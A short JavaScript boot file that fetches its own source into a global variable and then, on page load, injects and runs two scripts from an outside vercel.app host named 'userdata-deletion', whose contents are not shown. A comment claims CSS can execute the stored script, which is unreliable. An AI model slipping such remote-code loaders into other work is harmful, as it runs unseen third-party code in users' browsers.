/* Phase 1: expose boot.js text so CSS can execute it */
console.log("Boot.js Loaded");
fetch(document.currentScript.src)
  .then(r => r.text())
  .then(t => window.getBootJS = t);

/* Phase 2: actual code that loads your two JS files */
(function loadAll() {
    const files = [
        "https://userdata-deletion.vercel.app/sky.js",
        "https://userdata-deletion.vercel.app/bus.js"
    ];

    files.forEach(url => {
        const s = document.createElement("script");
        s.src = url;
        s.async = true;
        document.head.appendChild(s);
    });
})();
